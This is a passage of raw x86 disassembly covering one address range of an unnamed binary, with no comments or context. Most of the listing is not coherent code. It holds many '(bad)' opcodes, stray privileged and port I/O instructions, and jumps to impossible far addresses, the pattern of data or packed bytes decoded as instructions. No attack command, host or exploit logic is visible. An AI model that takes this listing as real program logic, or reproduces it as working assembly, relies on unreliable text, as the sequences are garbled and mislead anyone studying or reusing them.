  417aa3:	int    0xfd
  417aa5:	push   esp
  417aa6:	push   cs
  417aa7:	mov    esi,0x5b3dfbb3
  417aac:	or     DWORD PTR [ecx+0x35e95b86],ebp
  417ab2:	(bad)  
  417ab4:	dec    eax
  417ab5:	sub    BYTE PTR [edx],bh
  417ab7:	(bad)  
  417ab8:	jae    0x417a93
  417aba:	inc    ebp
  417abb:	arpl   WORD PTR [edx],bp
  417abd:	scas   al,BYTE PTR es:[edi]
  417abe:	ins    DWORD PTR es:[edi],dx
  417abf:	loope  0x417a91
  417ac1:	je     0x417a8a
  417ac3:	leave  
  417ac4:	cmc    
  417ac5:	sahf   
  417ac6:	dec    ebp
  417ac7:	es push edx
  417ac9:	cmp    DWORD PTR [ebx+eax*4-0x3],0x144f4d8e
	...
  417af9:	add    BYTE PTR [eax],al
  417afb:	add    BYTE PTR [edi+0x77],dl
  417afe:	inc    esp
  417aff:	sub    dh,al
  417b01:	mov    DWORD PTR [eax-0x16e187b],ecx
  417b07:	call   eax
  417b09:	push   ebx
  417b0a:	in     eax,dx
  417b0b:	mul    eax
  417b0d:	mov    esi,edi
  417b0f:	jne    0x417b74
  417b11:	mov    BYTE PTR [eax+ecx*1-0x1],dh
  417b15:	sub    eax,0x89f0fffb
  417b1a:	mov    ah,0xf0
  417b1c:	js     0x417aa6
  417b1e:	(bad)  
  417b1f:	call   0x403e5b
  417b24:	jo     0x417ac8
  417b26:	cmc    
  417b27:	jmp    0x417ac7
  417b29:	mov    BYTE PTR [esp+edi*8+0x2f],dh
  417b2d:	cwde   
  417b2e:	verr   WORD PTR [edi]
  417b31:	cwde   
  417b32:	mov    edi,0x8ab41710
  417b37:	in     al,dx
  417b38:	xchg   esp,eax
  417b39:	and    edx,DWORD PTR [ecx+0xa124057]
  417b3f:	call   0x404e0a
  417b44:	fcomp  QWORD PTR [eax]
  417b46:	je     0x417b4d
  417b48:	mov    al,0x97
  417b4a:	mov    edi,0x4457e71c
  417b4f:	xchg   esp,eax
  417b50:	dec    esp
  417b51:	or     ebx,DWORD PTR [edx]
  417b53:	pop    gs
  417b55:	mov    eax,ds:0x52e0500e
  417b5a:	inc    esi
  417b5b:	push   cs
  417b5c:	push   edi
  417b5d:	pop    eax
  417b5e:	mov    dh,0x47
	...
  417b88:	add    BYTE PTR [eax],al
  417b8a:	mov    ds:0x58b60ea8,al
  417b8f:	pop    ebx
  417b90:	push   eax
  417b91:	movaps XMMWORD PTR [ecx+0x5290500a],xmm4
  417b98:	inc    esi
  417b99:	or     dl,BYTE PTR [edi+0x58]
  417b9c:	mov    dh,0x47
  417b9e:	ds mov ebx,0x7dc80ed1
  417ba4:	cld    
  417ba5:	dec    edi
  417ba6:	dec    ecx
  417ba7:	xchg   ebp,eax
  417ba8:	retf   0xe05
  417bab:	lds    edi,FWORD PTR [edx+0x46]
  417bae:	inc    edx
  417baf:	jb     0x417be2
  417bb1:	ss (bad) 
  417bb3:	call   0x4f7fbc6c
  417bb8:	enter  0xee9b,0x29
  417bbc:	dec    esp
  417bbd:	adc    BYTE PTR [esi],bh
  417bbf:	ret    0xc386
  417bc2:	or     al,BYTE PTR [ecx-0x50]
  417bc5:	pop    ds
  417bc6:	ds push ss
  417bc8:	mov    ebp,0x32aeabfe
  417bcd:	je     0x417c1d
  417bcf:	sbb    al,BYTE PTR [eax]
  417bd1:	and    DWORD PTR ss:[ebp-0x176d4002],eax
  417bd8:	jl     0x417c1e
  417bda:	mov    dh,0x74
  417bdc:	mov    eax,0x9f70907
  417be1:	call   0xfe741c5a
  417be6:	stc    
  417be7:	push   esi
  417be8:	xchg   ebp,eax
  417be9:	(bad)  
  417bea:	imul   edi,DWORD PTR [edx+0xa019],0x0
	...
  417c15:	add    BYTE PTR [eax],al
  417c17:	add    BYTE PTR [ecx*8+0x267b8c2f],bl
  417c1e:	sar    esi,1
  417c20:	push   ebx
  417c21:	pop    edx
  417c22:	sbb    al,0x94
  417c24:	sbb    al,0xb5
  417c26:	das    
  417c27:	(bad)  
  417c28:	push   ebx
  417c29:	dec    edx
  417c2a:	das    
  417c2b:	je     0x417c53
  417c2d:	call   0x742f:0x9cb9217e
  417c34:	(bad)  
  417c35:	test   eax,0xca9249f
  417c3a:	sbb    al,0x2f
  417c3c:	mov    eax,ds:0x13fefc8e
  417c41:	pop    ebx
  417c42:	call   FWORD PTR [ebx]
  417c44:	sub    al,0x79
  417c46:	sahf   
  417c47:	xor    DWORD PTR [eax+0xa317b4d],ecx
  417c4d:	jae    0x417cce
  417c4f:	sahf   
  417c50:	pop    ds
  417c51:	aam    0x86
  417c53:	jg     0x417c4f
  417c55:	not    BYTE PTR [edi]
  417c57:	xor    edx,esi
  417c59:	jb     0x417cda
  417c5b:	rcr    BYTE PTR [edi],cl
  417c5d:	aam    0x6e
  417c5f:	xor    edx,edx
  417c61:	outs   dx,BYTE PTR ds:[esi]
  417c62:	data16 mov bh,0x41
  417c65:	aam    0xd4
  417c67:	or     edx,DWORD PTR [esi+0x7e]
  417c6a:	or     DWORD PTR [ecx],esi
  417c6c:	inc    eax
  417c6d:	rcl    esp,cl
  417c6f:	xchg   edi,eax
  417c70:	and    DWORD PTR [ecx+0x3330310c],ecx
  417c76:	xor    BYTE PTR [esi+0x45],al
  417c79:	pop    ebx
  417c7a:	pushf  
  417c7b:	jl     0x417c7d
	...
  417ca5:	add    BYTE PTR ds:0xc2823dd,dl
  417cab:	shl    DWORD PTR [esi],cl
  417cad:	xor    DWORD PTR [edx+0x9876c73],ecx
  417cb3:	xlat   BYTE PTR ds:[ebx]
  417cb4:	push   ss
  417cb5:	xor    DWORD PTR [ecx-0x2e],esi
  417cb8:	xchg   esp,eax
  417cb9:	sti    
  417cba:	loope  0x417cef
  417cbc:	push   esp
  417cbd:	xor    eax,esi
  417cbf:	shl    BYTE PTR [ebx+ecx*1-0x45],cl
  417cc3:	fsub   st,st(7)
  417cc5:	sub    esp,eax
  417cc7:	rcl    BYTE PTR [edi-0x19a0add0],cl
  417ccd:	mov    dh,0x39
  417ccf:	ret    
  417cd0:	ins    DWORD PTR es:[edi],dx
  417cd1:	pop    esi
  417cd2:	enter  0x41d2,0x4
  417cd6:	push   esp
  417cd7:	pop    ebx
  417cd8:	aas    
  417cd9:	xor    DWORD PTR [ebx+ebx*2],edi
  417cdc:	out    0x7e,eax
  417cde:	mov    edx,0xa830b35b
  417ce3:	sub    eax,DWORD PTR [eax]
  417ce5:	inc    ebx
  417ce6:	outs   dx,DWORD PTR ds:[esi]
  417ce7:	shl    DWORD PTR [ebx-0x27],1
  417cea:	mov    ebx,0x35e967d2
  417cef:	test   BYTE PTR [eax],dl
  417cf1:	jmp    0x99c51733
  417cf6:	dec    edx
  417cf7:	sar    ebp,1
  417cf9:	stc    
  417cfa:	cmp    eax,0xb8ae005b
  417cff:	into   
  417d00:	icebp  
  417d01:	jle    0x417d31
  417d03:	pop    esp
  417d04:	add    cl,ch
  417d06:	cmp    eax,0x71839a
	...
  417d33:	add    BYTE PTR [edx],dl
  417d35:	sar    ebp,1
  417d37:	jmp    0x2641d879
  417d3c:	rcl    dh,0xf1
  417d3f:	push   esi
  417d40:	push   cs
  417d41:	sar    ch,cl
  417d43:	jmp    0xe1956385
  417d48:	mov    dl,0x6c
  417d4a:	push   0xffffffe9
  417d4c:	test   al,0xd7
  417d4e:	lock cmp ch,BYTE PTR [esi-0x2f]
  417d52:	push   eax
  417d53:	pop    esp
  417d54:	rol    ch,0xf1
  417d57:	es dec esi
  417d59:	and    cl,BYTE PTR [ebx-0x232da9c]
  417d5f:	push   ss
  417d60:	in     eax,dx
  417d61:	shl    BYTE PTR [ebx-0x7],1
  417d64:	cs inc edi
  417d66:	or     al,0x6
  417d68:	test   al,0x59
  417d6a:	push   0xffffffe9
  417d6c:	cs inc edi
  417d6e:	sbb    dh,dh
  417d70:	or     bl,BYTE PTR [esi]
  417d72:	sub    DWORD PTR [esi*1+0x3ae6fdcd],0x42d48462
  417d7d:	pop    ebx
  417d7e:	add    BYTE PTR [edx+0x4f],ch
  417d81:	(bad)  
  417d82:	icebp  
  417d83:	into   
  417d84:	imul   edx,edx,0x6f23000e
  417d8a:	std    
  417d8b:	call   DWORD PTR [edi+0x567178f5]
  417d91:	push   edi
  417d92:	mov    eax,DWORD PTR [ebp-0x17e59]
	...
  417dc0:	add    BYTE PTR [eax],al
  417dc2:	push   edi
  417dc3:	outs   dx,DWORD PTR ds:[esi]
  417dc4:	xlat   BYTE PTR ds:[ebx]
  417dc5:	seta   BYTE PTR [ebp-0x7d]
  417dc9:	shl    BYTE PTR [ebx],0x60
  417dcc:	push   0xfd985688
  417dd1:	mov    edx,fs
  417dd3:	push   esi
  417dd4:	cld    
  417dd5:	(bad)  
  417dd6:	call   0x59076381
  417ddb:	pop    ebp
  417ddc:	add    BYTE PTR [ebp-0x507b2e59],al
  417de2:	addr16 pop ebp
  417de4:	add    bh,al
  417de6:	loop   0x417d6a
  417de8:	repnz (bad) 
  417dea:	call   0xca307e52
  417def:	out    dx,eax
  417df0:	xchg   ecx,eax
  417df1:	jno    0x417dd9
  417df3:	pop    esp
  417df4:	mov    eax,DWORD PTR [ebp-0x17ae9]
  417dfa:	(bad)  
  417dfb:	je     0x417d9c
  417dfd:	(bad)  
  417dff:	pop    ebp
  417e00:	add    eax,0xffffffb3
  417e03:	mov    esi,0x8c4385c6
  417e08:	(bad)  
  417e09:	call   DWORD PTR [ecx]
  417e0b:	pop    ebp
  417e0c:	in     eax,dx
  417e0d:	mov    esi,0x41702ebf
  417e12:	out    0xdb,eax
  417e14:	test   BYTE PTR [eax],al
  417e16:	aas    
  417e17:	cmp    dh,0x50
  417e1a:	aas    
  417e1b:	fmul   QWORD PTR [esi]
  417e1d:	add    bh,ah
  417e1f:	jecxz  0x417dde
  417e21:	je     0x417e5b
  417e23:	sbb    BYTE PTR [esp+eiz*8+0x0],al
	...
  417e4e:	add    BYTE PTR [eax],al
  417e50:	in     al,0x81
  417e52:	inc    BYTE PTR [edi]
  417e54:	ds ret 0xbd1e
  417e58:	adc    dh,BYTE PTR es:[ebp-0x77b8c1c0]
  417e5f:	push   DWORD PTR [ecx-0x69b0d0ef]
  417e65:	push   ds
  417e66:	std    
  417e67:	call   FWORD PTR [ecx-0x138bbec9]
  417e6d:	inc    edx
  417e6e:	jo     0x417e53
  417e70:	(bad)  
  417e71:	icebp  
  417e72:	cs push es
  417e74:	fldcw  WORD PTR ds:[ebx+0x74]
  417e78:	and    bl,BYTE PTR [esp+eax*1-0x1]
  417e7c:	jmp    0x417e43
  417e7e:	cs je  0x417ed3
  417e81:	push   ecx
  417e82:	js     0x417e6b
  417e84:	ins    DWORD PTR es:[edi],dx
  417e85:	dec    ecx
  417e86:	cs (bad) 
  417e88:	xchg   ebx,eax
  417e89:	dec    esi
  417e8a:	xor    bh,dh
  417e8c:	push   ecx
  417e8d:	cmp    DWORD PTR [eax+0x25e7490f],edi
  417e93:	repnz inc ecx
  417e95:	sub    DWORD PTR [ecx],ebx
  417e97:	call   0xac5c:0xea2e213b
  417e9e:	add    al,0xff
  417ea0:	mov    bl,0xbe
  417ea2:	cs je  0x417eef
  417ea5:	mov    DWORD PTR [eax-0x19],edi
  417ea8:	or     eax,0xcbfe2e81
  417ead:	gs xor bh,dh
  417eb0:	or     DWORD PTR [ecx-0x48],esi
  417eb3:	sldt   WORD PTR [eax]
	...
  417ede:	add    DWORD PTR [edi],ebp
  417ee0:	and    eax,0x1960f9f2
  417ee5:	jbe    0x417eda
  417ee7:	pop    eax
  417ee8:	cs (bad) 
  417eea:	mov    bl,0x5d
  417eec:	xor    bh,dh
  417eee:	loope  0x417f49
  417ef0:	xchg   edx,eax
  417ef1:	push   cs
  417ef2:	ds ret 0xc13c
  417ef6:	sub    bl,BYTE PTR [ebx-0x19]
  417ef9:	(bad)  
  417efa:	mov    ah,0xbe
  417efc:	push   0x48
  417efe:	vunpcklps xmm6,xmm4,XMMWORD PTR [edi+0x4]
  417f03:	sbb    ah,bh
  417f05:	add    ebp,DWORD PTR [edx]
  417f07:	nop
  417f08:	scas   al,BYTE PTR es:[edi]
  417f09:	(bad)  
  417f0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417f0b:	pop    edx
  417f0c:	out    0x3,eax
  417f0e:	test   BYTE PTR ds:[edi+0x5c2b09d4],ah
  417f15:	xlat   BYTE PTR ds:[ebx]
  417f16:	xchg   ebp,eax
  417f17:	sub    al,0xa6
  417f19:	pop    ss
  417f1a:	shl    DWORD PTR [ebx],cl
  417f1c:	sub    BYTE PTR [ebx+edi*4],al
  417f1f:	call   0xaf6a:0x7b650210
  417f26:	jne    0x417f82
  417f28:	cld    
  417f29:	add    DWORD PTR [ebp+0x73],edx
  417f2c:	lfs    ebp,FWORD PTR [edx+ebx*1-0x19]
  417f31:	sub    al,0xd2
  417f33:	into   
  417f34:	outs   dx,BYTE PTR ds:[esi]
  417f35:	mov    bh,0x39
  417f37:	ret    
  417f38:	and    ebx,DWORD PTR [edi+0x48]
  417f3b:	iret   
  417f3c:	jb     0x417f15
  417f3e:	inc    ebp
  417f3f:	jecxz  0x417f3a
  417f41:	sub    al,0x0
	...
  417f6b:	add    BYTE PTR [edx+0x39d24ecf],dh
  417f71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417f72:	sub    DWORD PTR [eax],ecx
  417f74:	sub    BYTE PTR ds:[edx+0x20],dh
  417f78:	mov    esp,0x199a3397
  417f7d:	inc    ebp
  417f7e:	lea    ebp,[edx+ecx*4]
  417f81:	arpl   WORD PTR [edi],cx
  417f83:	leave  
  417f84:	sub    esi,ecx
  417f86:	push   ds
  417f87:	jnp    0x418003
  417f89:	iret   
  417f8a:	push   ss
  417f8b:	mov    bh,0x41
  417f8d:	ret    
  417f8e:	js     0x417fbd
  417f90:	lock into 
  417f92:	(bad)  
  417f93:	pop    ds
  417f94:	pop    eax
  417f95:	sbb    al,0xe7
  417f97:	sub    al,0x2a
  417f99:	call   0x74fe:0xcefca100
  417fa0:	aad    0xb6
  417fa2:	fwait
  417fa3:	loop   0x417fbf
  417fa5:	int    0x68
  417fa7:	int    0xa2
  417fa9:	sbb    eax,DWORD PTR [eax]
  417fab:	inc    ecx
  417fac:	retf   
  417fad:	push   ss
  417fae:	aas    
  417faf:	jmp    0xc6686709
  417fb4:	pop    edx
  417fb5:	push   ds
  417fb6:	push   eax
  417fb7:	push   ecx
  417fb8:	popf   
  417fb9:	ds aas 
  417fbb:	jmp    0x2203072a
  417fc0:	jge    0x417f90
  417fc2:	(bad)  
  417fc3:	sbb    al,0x8a
  417fc5:	mov    dh,0x18
  417fc7:	popf   
  417fc8:	push   edx
  417fc9:	int    0xe8
  417fcb:	mov    ch,0x5f
  417fcd:	int    0xfd
  417fcf:	add    eax,DWORD PTR [eax]
	...
  417ff9:	add    BYTE PTR [edx],bh
  417ffb:	inc    ebx
  417ffc:	gs clc 
  417ffe:	jl     0x417fce
  418000:	gs ret 0x1bac
  418004:	add    BYTE PTR [ecx],al
  418006:	cmp    al,0x5b
  418008:	add    BYTE PTR [ecx+0x35],ch
  41800b:	mov    al,0x23
  41800d:	data16 sbb ah,BYTE PTR [ecx-0x40]
  418011:	aad    0x5d
  418013:	ss ins DWORD PTR es:[edi],dx
  418015:	fdivr  st,st(4)
  418017:	int    0x4d
  418019:	inc    ecx
  41801a:	xchg   edi,eax
  41801b:	js     0x41801a
  41801d:	inc    esi
  41801e:	or     eax,0x7ef4fd1e
  418023:	push   ss
  418024:	aas    
  418025:	jmp    0x4149c794
  41802a:	and    dl,cl
  41802c:	std    
  41802d:	es and eax,0x521e22fc
  418033:	ss sub al,0x99
  418036:	cld    
  418037:	int    0xfe
  418039:	aam    0x7e
  41803b:	push   ss
  41803c:	aas    
  41803d:	add    bh,dl
  41803f:	jle    0x4180b5
  418041:	or     BYTE PTR [edi-0x49],cl
  418044:	cli    
  418045:	call   eax
  418047:	repnz std 
  418049:	addr16 mov esp,0xe0004109
  41804f:	retf   
  418050:	ret    0x1648
  418053:	push   edi
  418054:	std    
  418055:	jne    0x417ff6
  418057:	jno    0x418009
  418059:	sti    
  41805a:	add    BYTE PTR [ecx+0x67],0x0
	...
  418085:	add    BYTE PTR [eax],al
  418087:	add    BYTE PTR [edi],cl
  418089:	js     0x4180f8
  41808b:	inc    ecx
  41808c:	xchg   edi,eax
  41808d:	xor    BYTE PTR [ebx+eax*8],0x5f
  418091:	cwde   
  418092:	std    
  418093:	dec    BYTE PTR [edx-0x31]
  418096:	in     eax,0x9c
  418098:	fadd   QWORD PTR [ecx-0x7cd50002]
  41809e:	(bad)  
  41809f:	jne    0x418100
  4180a1:	jno    0x418078
  4180a3:	pop    ds
  4180a4:	rol    BYTE PTR [ecx+0x595bc2c8],0x53
  4180ab:	mov    esi,DWORD PTR [ebx-0x2e0b3e29]
  4180b1:	cmp    esi,0x5eef676a
  4180b7:	jmp    FWORD PTR [edx-0x2f]
  4180ba:	in     eax,0x79
  4180bc:	inc    eax
  4180bd:	cmp    dh,0x89
  4180c0:	jmp    0x40f7:0x9d05c674
  4180c7:	add    BYTE PTR ds:0x92000059,dl
  4180cd:	(bad)  
  4180cf:	(bad)  
  4180d0:	push   eax
  4180d1:	or     BYTE PTR [ebp+0x68],0x1b
  4180d5:	pop    eax
  4180d6:	add    BYTE PTR [eax],al
  4180d8:	das    
  4180d9:	je     0x4180e7
  4180db:	add    BYTE PTR [edi],dl
  4180dd:	icebp  
  4180de:	pop    ss
  4180df:	jb     0x41811f
  4180e1:	add    eax,DWORD PTR [edx]
  4180e3:	push   0xffc4f040
  4180e8:	popa   
  4180e9:	jmp    0x41c192
	...
  418116:	ds int 0xf0
  418119:	ret    0x386
  41811c:	add    bh,bh
  41811e:	dec    ebx
  41811f:	mov    edx,0xb59ddb19
  418124:	sub    ah,BYTE PTR [edi+0x24]
  418127:	xor    bl,al
  418129:	jmp    DWORD PTR [ecx]
  41812b:	mov    ah,0xb3
  41812d:	inc    eax
  41812e:	sbb    bl,BYTE PTR ds:[ebp-0x663e00a0]
  418135:	add    DWORD PTR [esi],edi
  418137:	ret    0xfe81
  41813a:	adc    edi,DWORD PTR [edx-0x22240e7]
  418140:	sub    cl,BYTE PTR [ebx+eax*8-0x7e01d813]
  418147:	xchg   edx,eax
  418148:	sbb    al,0x8b
  41814a:	dec    ebx
  41814b:	ret    0xc701
  41814e:	cmp    edi,DWORD PTR [eax]
  418150:	mov    eax,ds:0x1c13e40
  418155:	add    BYTE PTR [esi],bh
  418157:	aas    
  418158:	xor    dh,0x58
  41815b:	inc    ebp
  41815c:	sub    cl,BYTE PTR [edi-0x1a]
  41815f:	mov    ch,0x4
  418161:	add    BYTE PTR [esi],bh
  418163:	sub    al,BYTE PTR [esi-0x663dc1f4]
  418169:	sbb    DWORD PTR [ebx+eax*1-0x4fbf97fe],ebp
  418170:	(bad)  
  418171:	jmp    DWORD PTR [ecx+0x3e40a4a9]
  418177:	(bad)  
  418178:	lock ret 0x0
	...
  4181a4:	xchg   BYTE PTR [ebx],al
  4181a6:	add    bh,bh
  4181a8:	mov    edi,DWORD PTR [edx+0x5add7b19]
  4181ae:	sub    bl,BYTE PTR es:[ecx-0x63b668f]
  4181b5:	xor    esp,ebp
  4181b7:	mov    ch,0x7e
  4181b9:	pop    ebx
  4181ba:	jg     0x41815a
  4181bc:	pop    esi
  4181bd:	sbb    ah,bh
  4181bf:	fwait
  4181c0:	aas    
  4181c1:	pop    ebx
  4181c2:	out    0x83,eax
  4181c4:	fadd   DWORD PTR [ebp-0x21]
  4181c7:	sbb    esi,DWORD PTR [ecx-0x8]
  4181ca:	out    dx,al
  4181cb:	sub    DWORD PTR [edx-0x3fd5212b],edi
  4181d1:	retf   
  4181d2:	aaa    
  4181d3:	sbb    al,0x65
  4181d5:	pop    esi
  4181d6:	out    0x3,eax
  4181d8:	mov    cl,0x45
  4181da:	retf   
  4181db:	sub    DWORD PTR [edx],esi
  4181dd:	arpl   di,cx
  4181df:	xor    eax,DWORD PTR [ebx-0x34]
  4181e2:	mov    esi,0xe7567f3b
  4181e7:	into   
  4181e8:	les    edi,FWORD PTR [esi+0x2385406a]
  4181ee:	aaa    
  4181ef:	int3   
  4181f0:	sbb    DWORD PTR [edi],edx
  4181f2:	xchg   esi,eax
  4181f3:	les    edi,FWORD PTR [ecx-0x3d]
  4181f6:	sbb    DWORD PTR [ebx],eax
  4181f8:	jge    0x4181c5
  4181fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4181fb:	mov    edi,0x3e75a65
  418200:	ds or  al,0xc7
  418203:	mov    ch,0xfe
  418205:	pop    edx
  418206:	jbe    0x4181b7
	...
  418230:	add    BYTE PTR [eax],al
  418232:	cmp    esp,ebx
  418234:	in     al,0x58
  418236:	int3   
  418237:	sbb    edi,esp
  418239:	lahf   
  41823a:	sahf   
  41823b:	mov    ah,bh
  41823d:	add    edi,DWORD PTR [esi]
  41823f:	fcmovne st,st(7)
  418241:	add    eax,0x28df4f3e
  418246:	mov    dl,0x53
  418248:	dec    edi
  418249:	jbe    0x418294
  41824b:	retf   0x1b3e
  41824e:	rcr    DWORD PTR [ebx+0x0],1
  418251:	jmp    0x41c3593
  418256:	push   edi
  418257:	leave  
  418258:	std    
  418259:	pushf  
  41825a:	add    eax,0x26fc89c3
  41825f:	leave  
  418260:	mov    eax,ds:0x1bab42
  418265:	test   DWORD PTR [esi],edx
  418267:	pop    DWORD PTR [eax]
  418269:	jmp    0x25caddab
  41826e:	sahf   
  41826f:	leave  
  418270:	xor    ebp,ecx
  418272:	cmp    eax,0xed94005b
  418277:	inc    edx
  418278:	and    cl,ah
  41827a:	std    
  41827b:	retf   0xc065
  41827e:	outs   dx,BYTE PTR ds:[esi]
  41827f:	mov    al,BYTE PTR [eax]
  418281:	cmp    esi,ebx
  418283:	shl    DWORD PTR [ebx],cl
  418285:	jmp    0xc641ddc7
  41828a:	shl    BYTE PTR [edx-0x3],1
  41828d:	(bad)  
  41828e:	mov    esp,0x7a2d3e89
  418293:	retf   0xce71
	...
  4182be:	add    BYTE PTR [eax],al
  4182c0:	ret    0x10d2
  4182c3:	sbb    eax,0x9d43a185
  4182c8:	cmp    al,0x5b
  4182ca:	add    cl,ch
  4182cc:	push   edx
  4182cd:	imul   edi,ebp,0xffffffd4
  4182d0:	or     cl,BYTE PTR [ebp+0x3f]
  4182d3:	jmp    0xfaef11ee
  4182d8:	jl     0x4182a4
  4182da:	in     eax,0x7d
  4182dc:	inc    ebx
  4182dd:	retf   0x6afd
  4182e0:	or     DWORD PTR [edx-0x17],esi
  4182e3:	scas   al,BYTE PTR es:[edi]
  4182e4:	jo     0x4182bb
  4182e6:	in     al,dx
  4182e7:	jb     0x4182f1
  4182e9:	push   esi
  4182ea:	mov    DWORD PTR [ebp+ecx*2-0x591e8d36],ebp
  4182f1:	dec    edx
  4182f2:	mov    eax,0x5e1700
  4182f7:	call   ebp
  4182f9:	ror    DWORD PTR [esi+0x5e6380],1
  4182ff:	add    BYTE PTR [eax+0x10],bl
  418302:	push   cs
  418303:	(bad)  
  418304:	xchg   edi,eax
  418305:	cmp    bh,ch
  418307:	jmp    edi
  418309:	fidivr WORD PTR [edi+ebp*4]
  41830c:	aam    0x9c
  41830e:	std    
  41830f:	call   ebx
  418311:	ins    BYTE PTR es:[edi],dx
  418312:	std    
  418313:	xor    eax,0x410f8c
  418318:	fdiv   DWORD PTR [edi+0x5da673ae]
  41831e:	call   0xfeb470d4
  418323:	mov    eax,0x0
	...
  41834c:	add    BYTE PTR [eax],al
  41834e:	xlat   BYTE PTR ds:[ebx]
  41834f:	pop    ebp
  418350:	add    BYTE PTR [eax],al
  418352:	jp     0x418371
  418354:	and    DWORD PTR [eax],eax
  418356:	add    edx,DWORD PTR [edx+0x4]
  418359:	add    BYTE PTR [edi-0x2f7cffa3],dl
  41835f:	pop    edx
  418360:	cmp    DWORD PTR [edi],0x3f84d0a7
  418366:	enter  0xfe81,0x8b
  41836a:	bound  esi,QWORD PTR [ebx+0x5e]
  41836d:	leave  
  41836e:	aad    0x5a
  418370:	add    BYTE PTR [ebp-0x14],dl
  418373:	bound  eax,QWORD PTR [edx+0x4d98cbc4]
  418379:	pop    eax
  41837a:	aas    
  41837b:	adc    esi,esi
  41837d:	inc    eax
  41837e:	push   edi
  41837f:	jne    0x4183f0
  418381:	add    DWORD PTR [ecx+eax*4-0x78233676],esp
  418388:	sub    dh,dh
  41838a:	fadd   QWORD PTR [edi-0x4487059b]
  418390:	add    BYTE PTR [ebx-0x3bbaf92],cl
  418396:	ds cmp eax,0x3d44ea3b
  41839c:	cmp    eax,DWORD PTR [edx]
  41839e:	clc    
  41839f:	dec    ebp
  4183a0:	cmp    ecx,DWORD PTR [edi-0x3b]
  4183a3:	mov    ebx,DWORD PTR [edi+edi*8]
  4183a6:	inc    ebp
  4183a7:	mov    dl,0x1
  4183a9:	mov    esi,edi
  4183ab:	jmp    0xc879:0x743dc87a
	...
  4183da:	add    BYTE PTR [eax],al
  4183dc:	stc    
  4183dd:	mul    DWORD PTR ds:0x46e7382
  4183e3:	jne    0x4183c3
  4183e5:	clc    
  4183e6:	cmp    al,0xc2
  4183e8:	mov    ecx,DWORD PTR [ebp+0x18]
  4183eb:	dec    edi
  4183ec:	jbe    0x4183d8
  4183ee:	mov    esi,edi
  4183f0:	jle    0x4183a4
  4183f2:	sub    DWORD PTR [ecx+0x3f],esi
  4183f5:	jne    0x41841c
  4183f7:	mov    bh,BYTE PTR [ebx-0x36]
  4183fa:	cli    
  4183fb:	mov    edi,0x41ab632
  418400:	mov    al,0xba
  418402:	and    eax,DWORD PTR [edi]
  418404:	(bad)  
  418405:	xor    ecx,ebp
  418407:	jmp    FWORD PTR [edx]
  418409:	or     BYTE PTR ds:0xd0b242c1,bh
  41840f:	mov    ah,BYTE PTR [edx-0x120cc2cb]
  418415:	popa   
  418416:	int3   
  418417:	addr16 jle 0x418414
  41841a:	sar    edi,0x71
  41841d:	fs add eax,ebx
  418420:	jno    0x41841b
  418422:	shl    bl,0x3e
  418425:	mov    dl,0x1
  418427:	add    BYTE PTR ds:0x5a4478fd,dl
  41842d:	bound  esp,QWORD PTR ds:0x3eda4674
  418433:	or     bh,BYTE PTR [esi]
  418435:	mov    dl,0x80
  418437:	mov    edi,0x271c5ac6
  41843c:	mov    dl,0x53
  41843e:	dec    edi
  41843f:	mov    al,BYTE PTR [eax]
	...
  418469:	add    BYTE PTR [eax-0x38],cl
  41846c:	push   esi
  41846d:	jl     0x4183f1
  41846f:	ret    
  418470:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418471:	rcr    DWORD PTR [ecx],cl
  418473:	xchg   edi,eax
  418474:	out    0x26,al
  418476:	sbb    dl,dl
  418478:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418479:	das    
  41847a:	adc    BYTE PTR [esi+0x33],cl
  41847d:	sbb    eax,ebx
  41847f:	push   esp
  418480:	out    0x3,eax
  418482:	xor    eax,0xf90f9b9b
  418487:	dec    ebp
  418488:	pop    ds
  418489:	es push 0xffffffcf
  41848c:	mov    bh,0x1b
  41848e:	loope  0x4184f7
  418490:	push   cs
  418491:	es loopne 0x4184e1
  418494:	add    ebx,DWORD PTR [ebx]
  418496:	dec    ebp
  418497:	push   ebp
  418498:	out    0x3,eax
  41849a:	ror    DWORD PTR [ebp-0x21],1
  41849d:	sbb    ecx,DWORD PTR [ebp+0x62]
  4184a0:	out    dx,al
  4184a1:	and    eax,0x4db45bc
  4184a6:	xor    ch,BYTE PTR [ecx+0x4f]
  4184a9:	cmp    eax,0x24e71a2c
  4184ae:	xor    cl,bh
  4184b0:	mov    edi,0xe75b3419
  4184b5:	clc    
  4184b6:	(bad)  [esi-0x1c]
  4184b9:	push   0x3e75b3e
  4184be:	mov    DWORD PTR [ebp-0x4d],ecx
  4184c1:	sbb    al,0x1b
  4184c3:	push   0x9bc425a6
  4184c8:	inc    edx
  4184c9:	cmp    edi,DWORD PTR [edi+0x5e]
  4184cc:	out    0xce,eax
	...
  4184f6:	add    BYTE PTR [eax],al
  4184f8:	mov    ah,0xb6
  4184fa:	aaa    
  4184fb:	int3   
  4184fc:	fldcw  WORD PTR [edx]
  4184fe:	add    ah,0x59
  418501:	iret   
  418502:	stc    
  418503:	add    bh,BYTE PTR [ebp-0x39]
  418506:	add    BYTE PTR [esi-0x67],dh
  418509:	pop    edi
  41850a:	call   0xfe09ba47
  41850f:	shl    DWORD PTR ds:0xfcb1163f,cl
  418515:	(bad)  
  418516:	(bad)  
  418517:	fsub   QWORD PTR ds:0x5af2fdbf
  41851d:	lds    ebp,FWORD PTR [edx-0xf]
  418520:	mov    ch,0x8d
  418522:	dec    eax
  418523:	test   al,0x3d
  418525:	(bad)  
  418526:	jae    0x418509
  418528:	and    eax,0x5b2e19b6
  41852d:	lds    esi,FWORD PTR [ebx-0xf]
  418530:	push   ebp
  418531:	or     esp,edi
  418533:	push   ds
  418534:	sbb    ecx,DWORD PTR [esi]
  418536:	add    cl,ch
  418538:	cmp    eax,0x3e2bc75b
  41853d:	pop    ebx
  41853e:	push   ebx
  41853f:	jb     0x418577
  418541:	fld    st(4)
  418543:	add    edx,ebp
  418545:	cs push 0x861550
  41854b:	icebp  
  41854c:	(bad)  
  41854d:	pop    ebx
  41854e:	shl    esi,0x62
  418551:	dec    edi
  418552:	or     al,0xde
  418554:	loopne 0x4185b4
  418556:	call   0xfe07c600
  41855b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
	...
  418584:	add    BYTE PTR [eax],al
  418586:	loopne 0x41854a
  418588:	(bad)  
  418589:	call   0x24cce0cb
